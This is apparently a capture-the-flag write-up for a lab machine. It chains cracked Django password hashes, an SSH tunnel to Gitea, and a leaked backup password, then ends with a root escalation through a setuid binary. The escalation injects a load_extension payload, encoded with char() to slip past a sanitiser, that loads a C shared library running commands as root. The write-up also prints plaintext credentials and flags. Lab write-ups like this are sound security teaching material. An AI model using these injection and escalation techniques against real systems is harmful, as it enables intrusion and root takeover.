SAyk0py1s84wl8relmjis71nwomh83bxjc.eJxVjMsOwiAQRf-FtSFlOozUpft-A-ExSNVAUtqV8d-VpAvdnnPufQnr9i3bvfFqlyguQonTL_MuPLh0Ee-u3KoMtWzr4mVP5GGbnGvk5_Vo_w6ya_m7JuQ0oHEDRSQ-j0p7JkI9upBSADCUULGaGDR5ABVMgggwaupoQvH-ANMuNxo:1p1tet:uptsvOM71vIf1W35r0yS014CHL63Si0JYYXwBCgwiQE2022-12-18 18:24:11.781905
UAobcde8c0pyct0fdhy4p8xwssvirxstv9.eJxVjDEOwjAMRe-SGUVumjgRIztniOzGJgXUSk07Ie4OlTrA-t97_2UybWvNW5Mlj8WcTTSn341peMi0g3Kn6TbbYZ7WZWS7K_agzV7nIs_L4f4dVGr1W3tkJY6QRNWnwB5BQ6cOxQv2Q5cYSCW6PmIXAUPx4FOB1CsKgQvm_QHqdTd4:1p1rOp:hHjGgeZA3FEvjVmwI_OQp4IWPoQINP8he0RpMdS9HGM2022-12-18 15:59:27.051845
SAflv9hsyegq6o5ykfp6vcjo3hjad567ur.eJxVjMsOwiAQRf-FtSFlOozUpft-A-ExSNVAUtqV8d-VpAvdnnPufQnr9i3bvfFqlyguQonTL_MuPLh0Ee-u3KoMtWzr4mVP5GGbnGvk5_Vo_w6ya_m7JuQ0oHEDRSQ-j0p7JkI9upBSADCUULGaGDR5ABVMgggwaupoQvH-ANMuNxo:1p1mDH:0iEMBiXHcIwR5eLrCLkEgZSnvGzTAImNFG_Mg__SQuo2022-12-18 10:27:11.176143
SAz6wfj39g7y4ro1cs6cy9wl3zwtcz92ch.eJxVjMsOwiAQRf-FtSFlOozUpft-A-ExSNVAUtqV8d-VpAvdnnPufQnr9i3bvfFqlyguQonTL_MuPLh0Ee-u3KoMtWzr4mVP5GGbnGvk5_Vo_w6ya_m7JuQ0oHEDRSQ-j0p7JkI9upBSADCUULGaGDR5ABVMgggwaupoQvH-ANMuNxo:1p1EyV:tXWuEJZ5bf8zC2IBzAOUgaaVMjtc695B_ZDO6F3fU-A2022-12-16 22:57:43.322348
QAzzkr85cbpgqzjo51kafycrgvftn9jg8x.eJxVjDsOAiEUAO9CbYj8HmBp7xnIAx6yaiBZdivj3Q3JFtrOTObNAu5bDfugNSyZXZhjp18WMT2pTZEf2O6dp962dYl8Jvywg996ptf1aP8GFUedW9DW6WyE8hCddWCyTKQS-GgpkVMKtfFnZYq3UFLxAq0p0WkDJCRI9vkCxXw3HA:1p1AuZ:U0_3BJScpCyiOnTOTLLb3Rc4OuZmwWYCyXVAUWL4Bzs2022-12-16 18:37:23.308384
UAyi9se9j04wj6aafubclxy1v4i3j0hnnh.eJxVjEsOwjAMBe-SNYpoGqcOS_Y9Q2XHLimgROpnhbg7VOoCtm9m3ssMtK152Badh0nMxXTm9LsxpYeWHcidyq3aVMs6T2x3xR50sX0VfV4P9-8g05K_dWJoKISGR5dEGBgjSWyAsD0LxFEwjNiBQ59UQR068orA3AZtvQfz_gAEqzhJ:1p1AqV:2DWY4DGvJutmY1BBl1WyvKThz-Y4kJmQ0zVRxYQ1oFg2022-12-16 18:33:11.965831
SAs9c3i4ytmwu4ulrvsi1ndgh8pu6iyk0u.eJxVjMsOwiAQRf-FtSFAebp07zeQGRikaiAp7cr479qkC93ec859sQjbWuM2aIlzZmcm2el3Q0gPajvId2i3zlNv6zIj3xV-0MGvPdPzcrh_BxVG_dYgXQEfnBA2gEVBKLI3BbRwmrR0UpukEgnjAZCctlZpxKAmCzaVybH3B9j1N5g:1p0LVX:O3JJHtoJAHSNjRQdsV9Jv8Ip5uMFMJ7sQ29MDHQaROE2022-12-14 11:44:07.495898
dawdw
IRelation-ship-management-group
'security-team
EdoodleGrive-development-team
public
dawdw+"
Relation-ship-management-group*
security-team( 
doodleGrive-development-team'
public
database_backup_plan!e
security_announcec
Hi!b
UA3kmo09a5cvs04hkc1chk4np7vhvst5s9.eJxVjDsOwjAQBe_iGller_GHkj5nsNbrNQmgRMqnQtwdIqWA9s3Me6lM29rnbZE5D1VdFBp1-h0L8UPGndQ7jbdJ8zSu81D0ruiDLrqbqjyvh_t30NPSf-uEzTNwA7FyhmiCoOUIBOAKJPQg4Bygj6k2NoFAnLGJfUCLXCio9wfrqjcx:1p9gGy:2MoHN9JtKvIOYkfPEKxUaVq2CRH_sgnwarZ1OXrxvAw2023-01-09 05:43:40.715808
UAlb7q9n1dkpm5robf4epc0s37g77gepxz.eJxVjDsOwjAQBe_iGln25uMNJT1nsJ7jNQkgW4qTCnF3iJQC2jcz76U8tnXyW5XFz1GdFZE6_Y4B40PyTuId-Vb0WPK6zEHvij5o1dcS5Xk53L-DCXX61kF6EHXBEEcHtgMlJrS2H7ht4QZJHXjkxlkTCMxdDzQ2miTRBeNEvT_2azfW:1p943S:3BY_crb_vvuMufEf_HSXWbIkEA0BAnGoFrUUqeb8HGo2023-01-07 12:55:10.529873
QAc9rp1oczujzqvhbpd7xthmdvsgtm5ry0.eJxVjEEOwiAQAP_C2RAoCywevfcNBBaQqqFJaU_GvxuSHvQ6M5k38-HYqz963vyS2JVNwC6_MAZ65jZMeoR2Xzmtbd-WyEfCT9v5vKb8up3t36CGXsdXRwFCgZtswiScKsVSkWSk0rIggAFHFqnkgIYUYoAMGoxxBqUSln2-4_c21w:1p8hKw:_JDpvdxMK2Eve3ffJ7tNVYHeK6Hfq1G8mDh1xcRhyc42023-01-06 12:39:42.956192
UAwpu7jg9hlqcynbjvq3gfclfusqetrbua.eJxVjDsOwjAQBe_iGlnxxl9Kes5geXdtHECOFCcV4u4QKQW0b2beS8S0rTVuPS9xYnEWoMTpd8REj9x2wvfUbrOkua3LhHJX5EG7vM6cn5fD_TuoqddvrcBicn7kQqSUd0axzQoQcIASSJvMOhRgNyAY7XWwZgQCTFg4kGXx_gABfjgu:1p9DB9:aj2YLBoYtdXbT9PDNIwXUCjJdDE7qan_QTXpmTAUPKk2023-01-07 22:39:43.009097
YAktwuu1v0bmppcu3waiirbxwd0fri839v.eJxVjDsOwjAQRO_iGllrW_5R0nMGy59dHEC2FCdVxN1JpBTQTDHvzWwsxHWpYR04h6mwKxOGXX7LFPML20HKM7ZH57m3ZZ4SPxR-0sHvveD7drp_BzWOuq8xaZC-CAPaqAwKpfKFoiDhJRWwSREAGSf2dIqMsoAeHUpDCFZr9vkC9O83dg:1p43LY:vPFJJ9KrPHE9SVuFfd3elT27UAshNNKzXdlBkGYT4Nw2022-12-24 17:09:08.326144
UAkc4wmpdgu25njmvkcnulqlm0zsplmw6k.eJxVjMsOwiAQRf-FtSHlMcK4dO83EAYGqRqalHZl_HdD0oVu7znnvkWI-1bD3nkNcxYXoZw4_Y4U05PbIPkR232RaWnbOpMcijxol7cl8-t6uH8HNfY6alusIkRTgLXVio2xoCb0hc7omDxp412BopnBQiTICJjy5FKxZLz4fAH65Tf2:1p41JF:dcNWnESjtPVH-3bQTprLEc_6d1jx3VQ-mfGsJmRbMag2022-12-24 14:58:37.446315
A4douqtfjkb6t7lmtdo002isg16sps2hn.eJxNjEsKwjAURUVwKIKr0EloPs8kM3HuGkpe8mKr0kI_Q8EFZBj34RJVVOgdnnO498XjOfvuljdpWbpxqMqxp66sQ05zrnNaTyA6f6Hmbbbh7JpTy3zbDF2N7JOwn-3ZsQ10Pfzb1eSgcn2V0z6oqDhaKyOQUIKTlAp4YU3EndWEBoU0OkIURKDAIQQL1odC-6hQmjyyFxN0P18:1p3zpL:2oBDVOKYIXaDBnEZywBVPW2hqdWn5dC91VEbhG9Yk802022-12-24 13:23:39.937115
SAupxd55esn27astq83891c9ottrsqbd9p.eJxVjMsOwiAQRf-FtSFlOozUpft-A-ExSNVAUtqV8d-VpAvdnnPufQnr9i3bvfFqlyguQonTL_MuPLh0Ee-u3KoMtWzr4mVP5GGbnGvk5_Vo_w6ya_m7JuQ0oHEDRSQ-j0p7JkI9upBSADCUULGaGDR5ABVMgggwaupoQvH-ANMuNxo:1p30dp:YqYdJUugXLcH0MdCs7Ejy-T_OqvpOPQP4CA_3sidpXY2022-12-21 20:03:41.075162
SA1ljtu0pvn8es3irnya1rq3nhuq4h5wpz.eJxVjDEOwjAMRe-SGUVy0sSEkZ0zRI5tSAGlUtNOiLtDpQ6w_vfef5lM61Lz2nXOo5iTcWAOv2MhfmjbiNyp3SbLU1vmsdhNsTvt9jKJPs-7-3dQqddvjYrECQEgKkQPyUMUxRIEAwljBD9cEybHLhVmTi64oygNgckpoHl_APS-N-A:1p9gLc:fev5VhFWhUoacuTApR0--7jc1eeMrRwJlm-kU2jnogU2023-01-09 05:48:28.772152
UA9zas0dulo9fn4a0ypqx48svhjbz0rpyu.eJxVjDsOwjAQBe_iGlnxxl9Kes5geXdtHECOFCcV4u4QKQW0b2beS8S0rTVuPS9xYnEWoMTpd8REj9x2wvfUbrOkua3LhHJX5EG7vM6cn5fD_TuoqddvrcBicn7kQqSUd0axzQoQcIASSJvMOhRgNyAY7XWwZgQCTFg4kGXx_gABfjgu:1p97lj:cQrWGx4B58ls2njMzTkSidprXK59TJVrGD8oA8N8XOE2023-01-07 16:53:07.832119
QAbbfm455c2iauj17wcn7fa68x8f400omt.eJxVjEEOwiAQRe_C2pChZKS4dO8ZyAwDUjU0Ke2q8e5K0oUu_38vb1eBtrWEraUlTKIuarDq9HsyxWeqnciD6n3Wca7rMrHuij5o07dZ0ut6uH-BQq30roHMUTCDTSzgiR2NdEYBickReGQRtEYAvjOjuMGgcREzgfVjUu8PMd443A:1p94PJ:SiUwq9cq4XBOFMFDCRmgUYmdHqUuIGOVJI8EKkFfPvg2023-01-07 13:17:45.515456
YAyfak82pqlnx2a96vqejsqg8iuxz8qeod.eJxVjDsOwjAQRO_iGllrW_5R0nMGy59dHEC2FCdVxN1JpBTQTDHvzWwsxHWpYR04h6mwKxOGXX7LFPML20HKM7ZH57m3ZZ4SPxR-0sHvveD7drp_BzWOuq8xaZC-CAPaqAwKpfKFoiDhJRWwSREAGSf2dIqMsoAeHUpDCFZr9vkC9O83dg:1p3vTa:7ZPYrcirKXUswbSFEUNr9H28mQ6cXQMZ9aTvNJnC7QQ2022-12-24 08:44:54.848557
YAijuok0t9s6g2nbvopmeg7drpzxowhv5h.eJxVjDsOwjAQRO_iGllrW_5R0nMGy59dHEC2FCdVxN1JpBTQTDHvzWwsxHWpYR04h6mwKxOGXX7LFPML20HKM7ZH57m3ZZ4SPxR-0sHvveD7drp_BzWOuq8xaZC-CAPaqAwKpfKFoiDhJRWwSREAGSf2dIqMsoAeHUpDCFZr9vkC9O83dg:1p3m4a:3tF5tpeoLgMEckoiCaj189_Y_HpdYSVqK9PWuI6qXYM2022-12-23 22:42:28.760159
```

open the sqlite3 with sqlitebrowser and in browse data we get

```
|sha1$W5IGzMqPgAUGMKXwKRmi08$030814d90a6a50ac29bb48e0954a89132302483a|
|sha1$E9cadw34Gx4E59Qt18NLXR$60919b923803c52057c0cdd1d58f0409e7212e9f|
|sha1$kyvDtANaFByRUMNSXhjvMc$9e77fb56c31e7ff032f8deb1f0b5e8f42e9e3004|
|sha1$ALgmoJHkrqcEDinLzpILpD$4b835a084a7c65f5fe966d522c0efcdd1d6f879f|
|sha1$jzpj8fqBgy66yby2vX5XPa$52f17d6118fce501e3b60de360d4c311337836a3|
```

we research it and we get they are Django(SHA-1)

`sudo hashcat -a 0 -m 124 -O --force a /usr/share/wordlists/rockyou.txt`

```
hashcat (v6.1.1) starting...

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.
OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-7200U CPU @ 2.50GHz, 5727/5791 MB (2048 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 31
Minimim salt length supported by kernel: 0
Maximum salt length supported by kernel: 51

Hashes: 5 digests; 5 unique digests, 5 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Precompute-Init
* Early-Skip
* Not-Iterated
* Prepended-Salt
* Raw-Hash

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

Dictionary cache building /usr/share/wordlists/rockyou.txt: 33553434 bytes (23.9Dictionary cache building /usr/share/wordlists/rockyou.txt: 100660302 bytes (71.Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344392
* Bytes.....: 139921507
* Keyspace..: 14344385
* Runtime...: 1 sec

sha1$kyvDtANaFByRUMNSXhjvMc$9e77fb56c31e7ff032f8deb1f0b5e8f42e9e3004:john316
[s]tatus [p]ause [b]ypass [c]heckpoint [q]uit => q

```

we have tom password so we try to su into the acc with no results, `john316`

we run `netstat -tuln` to check the port we previously saw filtered in the nmap

```
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State      
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN     
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN     
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN     
tcp6       0      0 :::80                   :::*                    LISTEN     
tcp6       0      0 :::22                   :::*                    LISTEN     
tcp6       0      0 :::3000                 :::*                    LISTEN     
udp        0      0 127.0.0.53:53           0.0.0.0:*                          
udp        0      0 0.0.0.0:68              0.0.0.0:* 
```

`ssh -L 3000:localhost:3000 martin@$TARGET`


now if we access we see a gittea we can enter with `martinCruz` and `Xk4@KjyrYv8t194L!`

we have only one repo

inside we find this `db_backup.sh`

```
#!/bin/bash
DB=$1
date_str=$(date +'%d_%b')
7z a -p'H@ckThisP@ssW0rDIfY0uC@n:)' /var/www/backups/${date_str}_db_backup.sqlite3.7z db.sqlite3
cd /var/www/backups/
ls -l --sort=t *.7z > backups_num.tmp
backups_num=$(cat backups_num.tmp | wc -l)
if [[ $backups_num -gt 10 ]]; then
      #backups is more than 10... deleting to oldest backup
      rm $(ls  *.7z --sort=t --color=never | tail -1)
      #oldest backup deleted successfully!
fi
rm backups_num.tmp

```

now we can uncompress the database dumps

in the latest one of dec we have this as before

```
pbkdf2_sha256$390000$ZjZj164ssfwWg7UcR8q4kZ$KKbWkEQCpLzYd82QUBq65aA9j3+IkHI6KK9Ue8nZeFU=
pbkdf2_sha256$390000$npEvp7CFtZzEEVp9lqDJOO$So15//tmwvM9lEtQshaDv+mFMESNQKIKJ8vj/dP4WIo=
pbkdf2_sha256$390000$GRpDkOskh4irD53lwQmfAY$klDWUZ9G6k4KK4VJUdXqlHrSaWlRLOqxEvipIpI5NDM=
pbkdf2_sha256$390000$wWT8yUbQnRlMVJwMAVHJjW$B98WdQOfutEZ8lHUcGeo3nR326QCQjwZ9lKhfk9gtro=
pbkdf2_sha256$390000$TBrOKpDIumk7FP0m0FosWa$t2wHR09YbXbB0pKzIVIn9Y3jlI3pzH0/jjXK0RDcP6U=
```

we search the type and it is `Possible algorithms: Django (PBKDF2-SHA256)`

as it is very heavy for the CPU we try another one

`7za e 1_Nov_db_backup.sqlite3.7z -p'H@ckThisP@ssW0rDIfY0uC@n:)'`

```
sha1$W5IGzMqPgAUGMKXwKRmi08$030814d90a6a50ac29bb48e0954a89132302483a
sha1$E9cadw34Gx4E59Qt18NLXR$60919b923803c52057c0cdd1d58f0409e7212e9f
sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a
sha1$ALgmoJHkrqcEDinLzpILpD$4b835a084a7c65f5fe966d522c0efcdd1d6f879f
sha1$jzpj8fqBgy66yby2vX5XPa$52f17d6118fce501e3b60de360d4c311337836a3
```
`sudo hashcat -a 0 -m 124 -O --force a /usr/share/wordlists/rockyou.txt`

```
hashcat (v6.1.1) starting...

You have enabled --force to bypass dangerous warnings and errors!
This can hide serious problems and should only be done when debugging.
Do not report hashcat issues encountered when using --force.
OpenCL API (OpenCL 1.2 pocl 1.6, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Core(TM) i5-7200U CPU @ 2.50GHz, 5727/5791 MB (2048 MB allocatable), 4MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 31
Minimim salt length supported by kernel: 0
Maximum salt length supported by kernel: 51

Hashes: 5 digests; 5 unique digests, 5 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Optimized-Kernel
* Zero-Byte
* Precompute-Init
* Early-Skip
* Not-Iterated
* Prepended-Salt
* Raw-Hash

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 65 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

sha1$Ri2bP6RVoZD5XYGzeYWr7c$4053cb928103b6a9798b2521c4100db88969525a:johnmayer7

```

now we can log as tom using `johnmayer7`


`cat user.txt`
`909aabc4ee7cefba845ac8a807c3e9c2`


```c++

undefined8 main(void)

{
  int iVar1;
  long in_FS_OFFSET;
  char local_58 [16];
  char local_48 [56];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  setenv("PATH","",1);
  setuid(0);
  setgid(0);
  puts(
      "[!]Caution this tool still in the development phase...please report any issue to the developm ent team[!]"
      );
  puts("Enter Username:");
  fgets(local_58,0x10,(FILE *)stdin);
  sanitize_string(local_58);
  printf("Enter password for ");
  printf(local_58,0x10);
  puts(":");
  fgets(local_48,400,(FILE *)stdin);
  sanitize_string(local_48);
  iVar1 = FUN_00401130(local_58,"moriarty");
  if (iVar1 == 0) {
    iVar1 = FUN_00401130(local_48,"findMeIfY0uC@nMr.Holmz!");
    if (iVar1 == 0) {
      puts("Welcome...!");
      main_menu();
      goto LAB_0040231e;
    }
  }
  puts("Invalid username or password.");
LAB_0040231e:
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}

```

now with creds we can enter and the func main_menu gets called

```c++
void main_menu(void)

{
  long in_FS_OFFSET;
  char local_28 [24];
  undefined8 local_10;
  
  local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28);
  fflush((FILE *)stdin);
  do {
    putchar(10);
    puts("doodleGrive cli beta-2.2: ");
    puts("1. Show users list and info");
    puts("2. Show groups list");
    puts("3. Check server health and status");
    puts("4. Show server requests log (last 1000 request)");
    puts("5. activate user account");
    puts("6. Exit");
    printf("Select option: ");
    fgets(local_28,10,(FILE *)stdin);
    switch(local_28[0]) {
    case '1':
      show_users_list();
      break;
    case '2':
      show_groups_list();
      break;
    case '3':
      show_server_status();
      break;
    case '4':
      show_server_log();
      break;
    case '5':
      activate_user_account();
      break;
    case '6':
      puts("exiting...");
                    /* WARNING: Subroutine does not return */
      exit(0);
    default:
      puts("please Select a valid option...");
    }
  } while( true );
}
```

the only one that admits some kind of user filled field is the 5 so we check that one

```c++
void activate_user_account(void)

{
  long lVar1;
  long in_FS_OFFSET;
  char local_148 [48];
  char local_118 [264];
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  printf("Enter username to activate account: ");
  fgets(local_148,0x28,(FILE *)stdin);
  lVar1 = FUN_00401160(local_148,&DAT_0049716d);
  local_148[lVar1] = '\0';
  if (local_148[0] == '\0') {
    puts("Error: Username cannot be empty.");
  }
  else {
    sanitize_string(local_148);
    snprintf(local_118,0xfa,
             "/usr/bin/sqlite3 /var/www/DoodleGrive/db.sqlite3 -line \'UPDATE accounts_customuser SE T is_active=1 WHERE username=\"%s\";\'"
             ,local_148);
    printf("Activating account for user \'%s\'...\n",local_148);
    system(local_118);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```

We can use a custom C extension inside that query to load it and scalate
https://sqlite.org/c3ref/load_extension.html
https://sqlite.org/loadext.html
https://sqlite.org/lang_corefunc.html#load_extension
We check the sanitize code first:
```c++
void sanitize_string(long param_1)

{
  bool bVar1;
  ulong uVar2;
  long in_FS_OFFSET;
  int local_3c;
  int local_38;
  uint local_30;
  undefined8 local_29;
  undefined local_21;
  long local_20;
  
  local_20 = *(long *)(in_FS_OFFSET + 0x28);
  local_3c = 0;
  local_29 = 0x5c7b2f7c20270a00;
  local_21 = 0x3b;
  local_38 = 0;
  do {
    uVar2 = FUN_00401180(param_1);
    if (uVar2 <= (ulong)(long)local_38) {
      *(undefined *)(param_1 + local_3c) = 0;
      if (local_20 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
        __stack_chk_fail();
      }
      return;
    }
    bVar1 = false;
    for (local_30 = 0; local_30 < 9; local_30 = local_30 + 1) {
      if (*(char *)(param_1 + local_38) == *(char *)((long)&local_29 + (long)(int)local_30)) {
        bVar1 = true;
        break;
      }
    }
    if (!bVar1) {
      *(undefined *)(local_3c + param_1) = *(undefined *)(local_38 + param_1);
      local_3c = local_3c + 1;
    }
    local_38 = local_38 + 1;
  } while( true );
}
```

here is our extension to read the flag
```c
#include <stdlib.h>
#include <unistd.h>
void sqlite3_a_init() {
setuid(0);
setgid(0);
system("/usr/bin/cat /root/root.txt > /tmp/a.txt");
}
```

`gcc -g -fPIC -shared a.c -nostartfiles -o a.so`



to load it we use the tool in the opt 5 and try this payload

`"+load_extension(./a)+"`

we get back this

```
Enter username to activate account: "+load_extension(./a)+"
Activating account for user '"+load_extension(.a)+"'...
Error: near ".": syntax error

```

the `/` is getting removed by the sanitize so we use chars to encode `./a` as `char(46,47,97)` so the new payload is

` "+load_extension(char(46,47,97))+"`

now we can find in /tmp/a.txt the flag `e1efc3b4382a8791c6147612655ce4f1`